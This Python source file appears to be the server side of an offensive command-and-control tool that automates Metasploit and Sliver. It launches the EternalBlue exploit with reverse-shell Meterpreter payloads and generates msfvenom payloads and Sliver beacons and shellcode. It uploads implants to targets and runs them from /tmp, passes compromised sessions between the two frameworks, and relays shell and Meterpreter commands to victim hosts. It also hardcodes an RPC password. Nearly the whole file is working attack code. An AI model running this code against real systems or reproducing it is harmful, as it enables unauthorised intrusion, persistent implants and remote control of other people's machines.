import os
import time
import socket
import threading
import subprocess
import json
import pexpect
from socket_threading import Server
from pymetasploit3.msfrpc import MsfRpcClient

from socket_threading import RED, BLUE, GREEN, YELLOW, RESET

MSF_HOST = "10.1.1.2"
MSF_PORT = 1337
MSF_PASSWORD = "memes"
RESOURCE_SCRIPT = "/usr/src/metasploit-framework/docker/msfconsole.rc"

# Alex New
SLIVER_HOST = "10.1.1.2"
SLIVER_PORT = 55552
# Alex End

# ────────────── globals ────────────────────────────────────────────────────────
server        = None
msfInstance   = None
sliver_server = None
sliver_client = None
# ───────────────────────────────────────────────────────────────────────────────
ALWAYS_PROMPT_OPTS_EXPLOIT = {"RHOSTS", "RPORT", "USERNAME", "PASSWORD", "THREADS", "LHOST", "LPORT", "PAYLOAD"}
ALWAYS_PROMPT_OPTS_AUXILIARY = {"RHOSTS", "RPORT", "USERNAME", "PASSWORD", "THREADS"}

def start_session_monitor():
    monitor_thread = threading.Thread(
        target=monitor_meterpreter_sessions,
        daemon=True
    )
    monitor_thread.start()

def monitor_meterpreter_sessions():
    """Prints new sessions continuously."""
    if msfInstance is None:
        return
    print(f"{GREEN}[+] Starting session monitor{RESET}")
    while True:
        try:
            for sid, sess in msfInstance.sessions.list.items():
                print(f"{GREEN}[+] Meterpreter session {sid} detected "
                      f"({sess['type']}){RESET}")
        except Exception:
            pass
        time.sleep(10)          # keep CPU happy
        
def run_meterpreter_exploit(target_ip):
    """Execute a Meterpreter payload against the target."""
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"

    exploit = msfInstance.modules.use("exploit", "windows/smb/ms17_010_eternalblue")
    if exploit is None:
        return f"{RED}[!] Failed to load exploit module{RESET}"

    # Set parameters for the exploit
    exploit["RHOSTS"] = target_ip
    exploit["PAYLOAD"] = "windows/x64/meterpreter/reverse_tcp"
    exploit["LHOST"] = "10.1.1.2"
    exploit["LPORT"] = 4444  # Listening port

    # Execute the exploit
    job_id = exploit.execute()
    return f"{GREEN}[+] Meterpreter exploit launched with job ID {job_id}{RESET}"

# Alex New
def generate_meterpreter_payload():
    output_file = "/workspace/enderCLI/meterpreter_payload"
    cmd = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={MSF_HOST} LPORT=4444 -f elf -o {output_file}"
    try:
        subprocess.run(cmd, shell=True, check=True)
        print(f"{GREEN}[+] Generated Meterpreter payload at {output_file}{RESET}")
        return "meterpreter_payload"
    except Exception as e:
        print(f"{RED}[!] Failed to generate Meterpreter payload: {e}{RESET}")
        return None
# Alex End

def connect_to_msfserver(password, server, port, max_retries=10, retry_delay=2):
    print(f"{GREEN}=============== Starting Metasploit API ==============={RESET}")
    for attempt in range(max_retries):
        try:
            msf_client = MsfRpcClient(password, server=server, port=port)
            print(f"{GREEN}[+] Successfully connected to MSF Server!{RESET}")
            return msf_client
        except Exception as e:
            print(f"{YELLOW}[!] Failed to connect to MSF Server: {e}, RETRYING ({attempt+1}/{max_retries}){RESET}")
            time.sleep(retry_delay)
    print(f"{RED}[!] Max retries reached. Could not connect to MSF Server.{RESET}")
    return None

def start_msfconsole_with_script(resource_script):
    """Launch msfconsole in the background using a resource script."""
    if not os.path.exists(resource_script):
        print(f"{RED}[!] Resource script {resource_script} not found!{RESET}")
        return False
    print(f"{GREEN}[+] Starting msfconsole with resource script: {resource_script}{RESET}")
    try:
        process = subprocess.Popen(
            ["msfconsole", "-r", resource_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        time.sleep(5)
        if process.poll() is not None:
            stdout, stderr = process.communicate()
            print(f"{RED}[!] msfconsole failed to start: {stderr}{RESET}")
            return False
        print(f"{GREEN}[+] msfconsole started successfully! PID: {process.pid}{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[!] Error starting msfconsole: {e}{RESET}")
        return False

def connect_msf():
    """Connect to Metasploit and start monitoring"""
    if not start_msfconsole_with_script(RESOURCE_SCRIPT):
        return None
    
    msf_instance = connect_to_msfserver(
        password=MSF_PASSWORD,
        server=MSF_HOST, 
        port=MSF_PORT
    )
    
    if msf_instance:
        global msfInstance
        msfInstance = msf_instance
        print(f"{GREEN}[+] Registered Metasploit with name 'msf'{RESET}")
        
        # Start session monitoring AFTER successful connection
        start_session_monitor()  # Now properly defined
        return msf_instance
    
    print(f"{RED}[!] Failed to register Metasploit{RESET}")
    return None

##############################
# Interact with Meterpreter
##############################
def interact_meterpreter(session_id, command):
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    all_sess = msfInstance.sessions.list
    if session_id not in all_sess:
        return f"{RED}[!] Session ID {session_id} not found.{RESET}"

    stype = all_sess[session_id]["type"]
    if stype != "meterpreter":
        return f"{RED}[!] Session {session_id} is a {stype} session, not Meterpreter.{RESET}"

    session = msfInstance.sessions.session(session_id)

    # Session passing (msf > sliver)
    # Alex New
    if command == "transfer-sliver":
        beacon_path = generate_beacon("5", "10", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="bin")
        if not beacon_path:
            return f"{RED}[-] Failed to generate Sliver beacon for handoff.{RESET}"
        session.write(f"upload {beacon_path} /tmp/sliver_beacon")
        session.run_with_output("shell chmod +x /tmp/sliver_beacon && /tmp/sliver_beacon &")
        return f"{GREEN}[+] Handed off session {session_id} to Sliver{RESET}"
    #else:
    #    response = session.run_with_output(command)
    #    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"
    # Alex End
    
    if command.startswith("upload "):
        parts = command.split(maxsplit=2) 
        if len(parts) != 3:
            return f"{RED}Usage: meterpreter <id> upload <local_path> <remote_path>{RESET}"
        local_path, remote_path = parts[1], parts[2]
        try:
            session.upload(local_path, remote_path)
            return f"{GREEN}[+] Uploaded {local_path} to {remote_path}{RESET}"
        except Exception as e:
            return f"{RED}[!] Upload failed: {e}{RESET}"

    elif command.startswith("download "):
        parts = command.split(maxsplit=2)
        if len(parts) != 3:
            return f"{RED}Usage: meterpreter <id> download <remote_path> <local_path>{RESET}"
        remote_path, local_path = parts[1], parts[2]
        try:
            session.download(remote_path, local_path)
            return f"{GREEN}[+] Downloaded {remote_path} to {local_path}{RESET}"
        except Exception as e:
            return f"{RED}[!] Download failed: {e}{RESET}"

    elif command.strip() == "shell":
        try:
            session.shell_write("\n")
            time.sleep(1)
            output = session.shell_read()
            return f"{GREEN}Shell opened. Enter commands directly:\n{output}{RESET}"
        except Exception as e:
            return f"{RED}[!] Failed to open shell: {e}{RESET}"

    else:
        try:
            output = session.run_with_output(command)
            return f"{GREEN}[+] Meterpreter Response:\n{output}{RESET}"
        except Exception as e:
            return f"{RED}[!] Error in Meterpreter command: {e}{RESET}"

##############################
# Searching
##############################
def search_exploit(keyword=None, start=0, count=20):
    if msfInstance is None:
        return [], 0
    all_exploits = msfInstance.modules.exploits
    if keyword:
        filtered = [x for x in all_exploits if keyword.lower() in x.lower()]
    else:
        filtered = all_exploits
    total = len(filtered)
    paginated = filtered[start : start+count]
    numbered = [f"{i+1+start}. {ex}" for i,ex in enumerate(paginated)]
    if start+count < total:
        numbered.append(f"{BLUE}[SERVER] Send 'next'/'prev' or 'exit'{RESET}")
    return numbered, total

def search_auxiliary_modules(keyword=None, start=0, count=20):
    if msfInstance is None:
        return [], 0
    all_aux = msfInstance.modules.auxiliary
    if keyword:
        filtered = [a for a in all_aux if keyword.lower() in a.lower()]
    else:
        filtered = all_aux
    total = len(filtered)
    paginated = filtered[start : start+count]
    return paginated, total


##############################
# Parse user param
##############################
def parse_param_value(opt_data, user_input):
    """Convert user_input to correct type: int for port, bool, etc."""
    if user_input is None:
        return None
    user_input = user_input.strip()
    if not user_input:
        return None

    msf_type = opt_data.get('type', '').lower()
    default_val = opt_data.get('default', None)

    if msf_type == 'bool' or isinstance(default_val, bool):
        return (user_input.lower() == 'true')
    elif msf_type == 'integer' or isinstance(default_val, int):
        return int(user_input)
    elif msf_type == 'port':
        return int(user_input)
    return user_input

#####################
# Run msf exploit 
#####################
def run_msf_exploit(mtype, mname, user_params, c2="metasploit",action="exploit"):
    if msfInstance is None:
        return f"{RED}[-] Not connected to Metasploit.{RESET}"

    try:
        exploit = msfInstance.modules.use(mtype, mname)
    except Exception as e:
        return f"{RED}[!] Failed to load module: {str(e)}{RESET}"
    
    payload_name = None
    # BYOS: bring your own stager (Sliver handoff)
    if c2 == "sliver":
        beacon_path = generate_beacon("5", "0", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="shellcode")
        if not beacon_path:
            return f"{RED}[-] Failed to generate Sliver shellcode.{RESET}"
        try:
            with open(beacon_path, "rb") as f:
                shellcode = f.read()
            exploit["PAYLOAD"] = "generic/custom"
            exploit["CUSTOM_PAYLOAD"] = shellcode
            exploit["LHOST"] = SLIVER_HOST
            exploit["LPORT"] = SLIVER_PORT
        except Exception as e:
            return f"{RED}[!] Error setting shellcode payload: {e}{RESET}"
    else:
        # ---------------- choose payload (only for 'exploit' action) -------------
        if action == "exploit" and mtype == "exploit":
            # choose meterpreter automatically if user omitted PAYLOAD
            payload_name = user_params.get("PAYLOAD") or pick_meterpreter_payload(exploit)
            try:
                exploit.payload = payload_name
            except Exception:
                pass   # some modules ignore .payload assignment
        
    # ---------------- apply user‑supplied options ----------------------------
    for k, v in user_params.items():
        try:
            if k in exploit.options:
                exploit[k] = v
        except Exception as e:
            print(f"{YELLOW}[!] Failed to set option {k}: {e}{RESET}")

    # ---------------- run check or exploit -----------------------------------
    try:
        if action == "check":
            chk = exploit.check() if callable(exploit.check) else exploit.check
            return str(chk)
        result = exploit.execute(payload=payload_name)
        return json.dumps(result)
    except Exception as e:
        return f"{RED}[!] Exploit failed: {e}{RESET}"


# Alex New
def interact_sliver(beacon_id, command):
    """Interact with a Sliver implant, including handoff to Metasploit."""
    global sliver_client
    if sliver_client is None:
        return f"{RED}[-] Sliver client not running.{RESET}"

    try:
        # Check if session exists by listing sessions
        sliver_client.sendline("beacons")
        time.sleep(5)
        output = sliver_client.read_nonblocking(size=4096, timeout=2)
        if beacon_id not in output:
            return f"{RED}[!] Invalid Sliver Beacon ID: {beacon_id}{RESET}"

        if command == "handoff_to_metasploit":
            # Generate Meterpreter payload
            payload_path = generate_meterpreter_payload()
            if not payload_path:
                return f"{RED}[-] Failed to generate Meterpreter payload.{RESET}"

            # Use the session
            sliver_client.sendline(f"use {beacon_id}")
            time.sleep(5)
            print(sliver_client.read_nonblocking(size = 4096, timeout = 2))

            # Upload payload
            upload_cmd = f"upload {payload_path} meterpreter_payload"
            sliver_client.sendline(upload_cmd)
            output = ""
            timeout = 30
            start_time = time.time()
            wrote_file = False
            while time.time() - start_time < timeout:
                chunk = sliver_client.read_nonblocking(size=1024, timeout=5)
                output += chunk
                print(chunk)
                if 'Wrote file' in chunk:
                    wrote_file = True
                    break
            if not wrote_file:
                return f"{RED}[!] Failed to upload Meterpreter payload: {output}{RESET}"

            # Execute payload
            execute_cmd = "execute meterpreter_payload"
            sliver_client.sendline(execute_cmd)
            output = ""
            timeout = 30
            start_time = time.time()
            while time.time() - start_time < timeout:
                chunk = sliver_client.read_nonblocking(size=1024, timeout=5)
                output += chunk
                print(chunk)
                if 'Command executed' in chunk:
                    break

            return f"{GREEN}[+] Handed off Sliver implant {beacon_id} to Metasploit{RESET}"
        else:
            sliver_client.sendline(f"use {beacon_id}")
            sliver_client.expect(r">", timeout=10)
            sliver_client.sendline(command)
            time.sleep(2)
            response = sliver_client.read_nonblocking(size=4096, timeout=2)
            return f"{GREEN}[+] Sliver Response:\n{response}{RESET}"

    except Exception as e:
        return f"{RED}[!] Error interacting with Sliver session: {e}{RESET}"
# Alex End

##########################
# Sliver Beacon Creation
##########################
def create_sliver_beacon(operator_name, lhost, seconds, jitter, http, os, arch, beacon_name, frmt="bin"):
    global sliver_server
    global sliver_client
    """Create Sliver Beacon"""
    print(f"{GREEN}=============== Create Sliver Beacon ==============={RESET}")
    
    # Spawn Sliver server and create new operator, importing to operator container
    spawn_sliver_server()
    create_new_operator(operator_name, lhost)
    print(f"{GREEN}[+] Successfully created Sliver Config file{RESET}")
    enable_multiplayer_mode()
    import_sliver_config_file(operator_name, lhost)

    # Spawn Sliver client and generate beacon
    spawn_sliver_client()
    generate_beacon(seconds, jitter, http, os, arch, beacon_name, frmt)

    # Send HTTP command
    print(f"{GREEN}[+] Sending HTTP command{RESET}")
    sliver_enable_http()

    print(f"{GREEN}[+] Successfully created Sliver beacon{RESET}")
    return True

def spawn_sliver_server():
    global sliver_server
    try:
        sliver_server = pexpect.spawn("sliver-server", encoding = 'utf-8')
        sliver_server.expect(r">", timeout=30)
        print(f"{GREEN}[+] Server Output: {RESET} {sliver_server.before + sliver_server.after}")
        return True
    except Exception as e:
        print(f"{RED}[!] Failed to spawn Sliver server: {e}")
        return False

def create_new_operator(operator_name, lhost):
    global sliver_server
    try:
        new_operator_cmd = f"new-operator --name {operator_name} --lhost {lhost}"
        sliver_server.sendline(new_operator_cmd)
        time.sleep(2)
        print(sliver_server.read_nonblocking(size = 4096, timeout = 2))
        return True
    except Exception as e:
        print(f"{RED}[!] Failed to create new Sliver operator: {e}")
        return False

def enable_multiplayer_mode():
    global sliver_server
    try:
        multiplayer_cmd = "multiplayer"
        sliver_server.sendline(multiplayer_cmd)
        time.sleep(2)
        print(sliver_server.read_nonblocking(size = 4096, timeout = 2))
        return True
    except Exception as e:
        print(f"{RED}[!] Failed to enable multiplayer mode in Sliver server: {e}")
        return False

def import_sliver_config_file(operator_name, lhost):
    try:
        import_config_file_command = f"sliver-client import {operator_name}_{lhost}.cfg"
        subprocess.run(import_config_file_command, shell = True, check = True)
        return True
    except Exception as e:
        print(f"{RED}[!] Failed to import Sliver config file in operator container: {e}")
        return False

def spawn_sliver_client():
    global sliver_client
    try:
        sliver_client = pexpect.spawn("sliver-client", encoding = 'utf-8')
        sliver_client.expect(r">", timeout=30)
        print(f"{GREEN}[+] Client Output: {RESET} {sliver_client.before + sliver_client.after}")
        return True
    except Exception as e:
        print(f"{RED}[!] Failed to spawn Sliver client: {e}")
        return False

def generate_beacon(seconds, jitter, http, os, arch, beacon_name, frmt="bin"):
    global sliver_client
    try:
        output_file = f"/workspace/enderCLI/{beacon_name}"
        if frmt == "shellcode":
            beacon_creation_command = f"generate beacon --seconds {seconds} --jitter {jitter} --http {http} --os {os} --arch {arch} --name {beacon_name} --format shellcode --save {output_file}"
        else:
            beacon_creation_command = f"generate beacon --seconds {seconds} --jitter {jitter} --http {http} --os {os} --arch {arch} --name {beacon_name} --save {output_file}"
        
        print(f"{GREEN}[+] Sending Beacon Creation Command: {beacon_creation_command}{RESET}")
        sliver_client.sendline(beacon_creation_command)
        output = ""
        timeout = 30
        start_time = time.time()
        while time.time() - start_time < timeout:
            chunk = sliver_client.read_nonblocking(size=1024, timeout=5)
            output += chunk
            print(chunk)
            if 'Implant saved to' in chunk:
                break
        return True

    except Exception as e:
        print(f"{RED}[!] Failed to generate Sliver beacon: {e}")
        return False

def sliver_enable_http():
    global sliver_client
    try:
        http_command = "http"
        sliver_client.sendline(http_command)
        time.sleep(5)
        print(sliver_client.read_nonblocking(size = 4096, timeout = 2))
    except Exception as e:
        print(f"{RED}[!] Failed to send http command in Sliver client: {e}")
        return False


#####################
# Validate Module 
#####################
def validate_module_type(module_type, module_name):
    if msfInstance is None:
        return False, f"{RED}[-] Not connected to Metasploit.{RESET}"

    module_lists = {
        "exploit": msfInstance.modules.exploits,
        "auxiliary": msfInstance.modules.auxiliary,
        "post": msfInstance.modules.post
    }

    if module_type not in module_lists:
        return False, f"{RED}Unknown module type {module_type}{RESET}"

    if module_name not in module_lists[module_type]:
        return False, f"{RED}{module_name} is NOT a valid {module_type} module{RESET}"

    return True, None

#####################
# helper method for payloads 
#####################
def pick_meterpreter_payload(exploit_mod):
    """
    • First look for a reverse‑tcp Meterpreter in exploit_mod.compatible_payloads.
    • If none, return the FIRST compatible payload Metasploit reports.
    • If list is empty, fall back to a platform guess, then generic shell.
    This guarantees we never return None.
    """
    try:
        for p in exploit_mod.compatible_payloads:
            if "meterpreter" in p and "reverse_tcp" in p:
                return p
        # no meterpreter; take the first compatible payload if available
        if exploit_mod.compatible_payloads:
            return exploit_mod.compatible_payloads[0]
    except Exception:
        pass

    # guess by platform path
    path = exploit_mod.fullname.lower()
    if "windows" in path:
        return "windows/x64/meterpreter/reverse_tcp"
    if "linux" in path:
        return "linux/x64/meterpreter/reverse_tcp"
    if "php" in path:
        return "php/meterpreter/reverse_tcp"
    if "java" in path:
        return "java/meterpreter/reverse_tcp"
    return "generic/shell_reverse_tcp"

##############################
# Main Handler
##############################
def handle_message(data, client_address):
    global msfInstance
    global sliver_client
    print(f"{BLUE}[Server] Processing message: '{data}' from {client_address}{RESET}")

    parts   = data.strip().split()
    command = parts[0] if parts else ""
    options = parts
    
    # Track user state
    if not hasattr(handle_message, 'search_state'):
        handle_message.search_state = {}
    client_state = handle_message.search_state.setdefault(
        client_address,
        {
            'keyword': None, 'start': 0,
            'in_search': False, 'in_run': False,
            'run_module': None, 'beacon': False
        }
    )
    
    # ------------------------------------------------------------------ create beacon
    if command == "create_beacon": 
        if len(options) < 9:
            response = f"{RED}[!] Invalid Sliver Beacon Creation command: create_beacon [operator_name] [lhost] [seconds] [jitter] [http] [os] [arch] [beacon_name] [format (default=bin)]{RESET}"
        else:
            response = f"{BLUE}[+] Creating Sliver Beacon...{RESET}"
            if len(options) == 9:
                beacon = create_sliver_beacon(options[1], options[2], options[3], options[4], options[5], options[6], options[7], options[8])
            else:
                beacon = create_sliver_beacon(options[1], options[2], options[3], options[4], options[5], options[6], options[7], options[8], options[9])
            if beacon:
                response = f"{BLUE}[+] Created Sliver Beacon!{RESET}"
                client_state['beacon'] = True
            else:
                response = f"{RED}[!] Sliver beacon creation failed!{RESET}"
        print(f"{BLUE}[Server] Sending response to {client_address}: {response}{RESET}")
        return response
    # ------------------------------------------------------------------ connect
    elif command == "connect":
        msfInstance = connect_msf()
        client_state.update({'in_search': False, 'in_run': False})
        return (
            f"{BLUE}[+] Connected to Metasploit!{RESET}"
            if msfInstance else
            f"{RED}[-] Failed to connect to Metasploit{RESET}"
        )
    
    # ------------------------------------------------------------------ search
    elif command == "search":
        if len(parts) < 3:
            return f"{RED}[!] Usage: search [exploits|auxiliary] <keyword> [start_index]{RESET}"

        mod_type  = parts[1].lower()
        keyword   = parts[2]
        start_idx = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 0

        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"

        if mod_type == "exploits":
            client_state.update({'keyword': keyword, 'start': start_idx, 'in_search': True})
            results, total = search_exploit(keyword, start_idx)
            if results:
                header = (
                    f"{BLUE}Exploit modules matching '{keyword}' "
                    f"({start_idx}-{min(start_idx+20, total)} of {total}):{RESET}"
                )
                return header + "\n" + "\n".join(results)
            return f"{BLUE}No matching exploit modules found.{RESET}"
        return f"{RED}[!] Invalid module type. Use 'search exploits' or 'search auxiliary'{RESET}"

    # ------------------------------------------------------------------ run (initial call + prompt cycle)
    elif command == "run" and not client_state.get("in_run"):
        # ── FIRST INVOCATION ────────────────────────────────────────────
        action = "exploit"
        if len(options) > 3 and options[3].lower() == "check":
            action = "check"
        if len(options) < 3:
            return f"{RED}[!] Usage: run [exploit|auxiliary] <module_name>{RESET}"

        module_type, module_name = options[1], options[2]
        ok, err = validate_module_type(module_type, module_name)
        if not ok:
            return err
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit. Use 'connect' first.{RESET}"
        
        extra_params = {}
        for tok in options[3:]:
            if "=" in tok:
                k, v = tok.split("=", 1)
                # look up metadata so we can cast correctly
                opt_def = msfInstance.modules.use(module_type, module_name)._info["options"].get(k, {})
                extra_params[k] = parse_param_value(opt_def, v)
                
        mod_obj  = msfInstance.modules.use(module_type, module_name)
        prompts  = []

        if module_type == "exploit":
            # ---- always ask PAYLOAD, LHOST, LPORT ----
            default_pay = pick_meterpreter_payload(mod_obj) 
            prompts.append({"name": "PAYLOAD","default": default_pay,
                            "prompt": f"Please enter PAYLOAD (default: {default_pay})"})
            prompts.append({"name": "LHOST","default": MSF_HOST,
                            "prompt": f"Please enter LHOST (default: {MSF_HOST})"})
            prompts.append({"name": "LPORT","default": 4444,
                            "prompt": "Please enter LPORT (default: 4444)"})
            for opt in ("SMBUser","SMBPass","RHOSTS","RPORT"):
                if opt in mod_obj.options:
                    info    = mod_obj._info["options"][opt]
                    default = info.get("default")
                    msg = f"Please enter {opt}" + (f" (default: {default})" if default is not None else "")
                    prompts.append({"name": opt,"default": default,"prompt": msg})
        elif module_type == "post":
            base_order = ()        
        # build prompts for auxiliary modules
        else:  # auxiliary
            for opt in ("USERNAME","PASSWORD","RHOSTS","RPORT","THREADS"):
                if opt in mod_obj.options:
                    info    = mod_obj._info["options"][opt]
                    default = info.get("default")
                    msg = f"Please enter {opt}" + (f" (default: {default})" if default is not None else "")
                    prompts.append({"name": opt,"default": default,"prompt": msg})
        # ▲▲▲ END new code ▲▲▲

        # safety: if no prompts needed, execute immediately
        if not prompts:
            return run_msf_exploit(
                module_type,
                module_name,
                extra_params,          # ← pass the inline NAME=value pairs
                action=action
            )

        client_state.update({
            "in_run": True,
            "prompt_queue": prompts,
            "user_params": {},
            "module_type": module_type,
            "module_name": module_name,
            "action": action,
            'extra_params': extra_params
        })
        return f"{BLUE}{prompts[0]['prompt']}: {RESET}"

    elif client_state.get("in_run"):
        # ── PROMPT CYCLE ────────────────────────────────────────────────
        current = client_state["prompt_queue"].pop(0)
        pname   = current["name"]
        mod     = msfInstance.modules.use(client_state["module_type"],
                                        client_state["module_name"])
        opt_def = mod._info["options"].get(pname, {})
        value   = parse_param_value(opt_def, data) or current.get("default")
        client_state["user_params"][pname] = value
                        
        if not client_state["prompt_queue"]:        # all answers collected
            merged = {**client_state.get("extra_params", {}),
              **client_state["user_params"]}
            
            client_state["in_run"] = False
            return run_msf_exploit(
                client_state["module_type"],
                client_state["module_name"],
                merged,
                action=client_state["action"]
            )

        nxt = client_state["prompt_queue"][0]
        return f"{BLUE}{nxt['prompt']}: {RESET}"

    # ------------------------------------------------------------------ next/prev/exit (search paging)
    elif command in ["next", "prev"] and client_state['in_search']:
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit.{RESET}"
        client_state['start'] += 20 if command == "next" else -20
        results, total = search_exploit(client_state['keyword'], client_state['start'])
        if results:
            header = (
                f"{BLUE}Exploit modules matching '{client_state['keyword']}' "
                f"({client_state['start']}-{min(client_state['start']+20, total)} of {total}):{RESET}"
            )
            return header + "\n" + "\n".join(results)
        return f"{BLUE}No more exploit modules available.{RESET}"
    
    elif command == "exit" and client_state['in_search']:
        client_state.update({'in_search': False, 'keyword': None, 'start': 0})
        return f"{BLUE}Returned to normal CLI.{RESET}"
    
    # ------------------------------------------------------------------ sessions
    elif command == "sessions":
        time.sleep(2)   # give new sessions a moment to appear
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit.{RESET}"
        sessions = msfInstance.sessions.list   # refresh
        if not sessions:
            return f"{YELLOW}[!] No active sessions detected{RESET}"
        lines = []
        for sid, det in sessions.items():
            lines.append(
                f"Session {sid}:\n"
                f"  Type: {det.get('type','?')}\n"
                f"  Host: {det.get('session_host','?')}\n"
                f"  Port: {det.get('session_port','?')}\n"
                f"  Via : {det.get('via_exploit','?')}"
            )
        return f"{GREEN}Active Sessions:\n{RESET}" + "\n\n".join(lines)

    # ------------------------------------------------------------------ shell <id> <command>
    elif command.startswith("shell"):
        parts = data.strip().split(maxsplit=2)
        if len(parts) < 3:
            return f"{RED}Usage: shell <session_id> <command>{RESET}"
        sid    = parts[1]          # keep as string
        sh_cmd = parts[2]

        # look up the session’s type from the cached list
        meta = msfInstance.sessions.list.get(sid, {})
        if meta.get("type") != "shell":
            return f"{RED}Session {sid} is not a plain shell session.{RESET}"

        try:
            sess = msfInstance.sessions.session(sid)   # ShellSession object
            sess.write(sh_cmd + "\n")
            time.sleep(1)                              # give it a moment
            output = sess.read()                       # read all available output
            if isinstance(output, bytes):
                output = output.decode(errors="ignore")
            return f"{GREEN}{output.strip()}{RESET}"
        except KeyError:
            return f"{RED}Session ID {sid} does not exist.{RESET}"

    # ------------------------------------------------------------------ meterpreter
    elif command.startswith("meterpreter"):
        parts = data.strip().split(maxsplit=2)
        if len(parts) < 3:
            return f"{RED}Usage: meterpreter <session_id> <command>{RESET}"
        session_id          = parts[1]     # keep as string
        meterpreter_command = parts[2]
        try:
            session = msfInstance.sessions.session(session_id)
            output  = session.run_with_output(meterpreter_command)
            return f"{GREEN}{output}{RESET}"
        except KeyError:
            return f"{RED}Session ID {session_id} does not exist.{RESET}"   
         
    # ------------------------------------------------------------------ sliver helpers
    elif command == "get-sliver-beacons":
        if sliver_client is None or not sliver_client.isalive():
            response = f"{RED}[-] Sliver client not running.{RESET}"
        else:
            sliver_client.sendline("beacons")
            time.sleep(2)
            print(sliver_client.read_nonblocking(size = 4096, timeout = 2))
            response = f"{GREEN}[+] Sliver Beacons Printed in Ender Server{RESET}"
        print(f"{BLUE}[Server] Sending response to {client_address}: {response}{RESET}")
        return response
            
    elif command == "sliver":
        if len(options) < 2:
            response = f"{RED}[!] Usage: sliver <beacon_id> <command>{RESET}"
        else:
            beacon_id, sliver_command = options[1], options[2]
            response = interact_sliver(beacon_id, sliver_command)
        print(f"{BLUE}[Server] Sending response to {client_address}: {response}{RESET}")
        return response
    # Alex End
    
    elif command == "jobs":
        if msfInstance is None:
            return f"{RED}[-] Not connected to Metasploit.{RESET}"
        jobs_dict = msfInstance.jobs.list
        if not jobs_dict:
            return "No active jobs."
        return "\n".join([f"ID {jid}: {info['name']}" for jid, info in jobs_dict.items()])

    # ------------------------------------------------------------------ quit
    elif command == "quit":
        if server is not None:
            server.exit()
            return f"{GREEN}[+] Server shutting down as requested.{RESET}"
        return f"{RED}[!] Server not initialized.{RESET}"
    
    # ------------------------------------------------------------------ fallthrough
    return f"{RED}[!] Unrecognized or incomplete command.{RESET}"
    
##############################
# MAIN
##############################
def main():
    global server
    server = Server(host='10.1.1.2', port=4444, message_handler=handle_message)
    server.start()
    try:
        while server.running:
            time.sleep(1)
    except KeyboardInterrupt:
        server.exit()


if __name__ == "__main__":
    main()
